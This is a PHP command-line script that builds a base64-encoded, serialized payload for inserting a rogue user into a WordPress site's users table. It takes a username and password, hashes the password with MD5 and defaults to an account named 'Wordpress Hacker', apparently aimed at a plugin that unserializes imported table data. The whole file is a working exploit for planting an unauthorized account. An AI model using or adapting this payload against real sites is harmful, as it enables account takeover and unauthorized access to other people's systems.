<?php

/**
 * @author Sergey M <yamldeveloper@proton.me>
 */

$options = getopt('hu:p:e:d:', ['help', 'user:', 'password:', 'email:', 'display-name']);
$defaults = [
  'user' => 'wph4ck3r',
  'password' => '**pWn3d**',
  'email' => 'anon@anonymouse.org',
  'display_name' => 'Wordpress Hacker',
];
$args = (object) null;
foreach ($defaults as $k => $v) $args->$k = $v;
foreach ($options as $k => $v) {
  switch ($k) {
    case 'h':
    case 'help':
      $args->help = true;
      break;
    case 'u':
    case 'user':
      $args->user = $v;
      break;
    case 'p':
    case 'password':
      $args->password = $v;
      break;
    case 'e':
    case 'email':
      $args->email = $v;
      break;
    case 'd':
    case 'display-name':
      $args->display_name = $v;
      break;
  }
}
if ($args->help) {
?>
Usage:
  php <?= basename($argv[0]) ?> [options]

Options:
  -h, --help          show help and exit
  -u, --user          username (default: <?= var_export($defaults['user'], true) ?>)
  -p, --password      password (default: <?= var_export($defaults['password'], true) ?>)
  -e, --email         email (default: <?= var_export($defaults['email'], true) ?>)
  -d, --display-name  display name (default: <?= var_export($defaults['display_name'], true) ?>)

<?php
  exit(0);
}

$payload = [
  'customData' => [
    'users' => [
      0 => [
        $args->user,
        // WordPress позволяет использовать md5 для хеширования паролей
        // https://github.com/WordPress/WordPress/blob/4b60af1a6ad8cdedb5c772b6a1fc4b7d146d3653/wp-includes/pluggable.php#L2379
        md5($args->password),
        $args->user,
        $args->email,
        'http://idi-nahui.ru',
        '0',
        $args->display_name,
      ]
    ]
  ],
  'customTablesColumsName' => [
    'users' => [
      ['Field' => 'user_login'],
      ['Field' => 'user_pass'],
      ['Field' => 'user_nicename'],
      ['Field' => 'user_email'],
      ['Field' => 'user_url'],
      ['Field' => 'user_status'],
      ['Field' => 'display_name'],
    ],
  ]
];

echo(base64_encode(serialize($payload)));
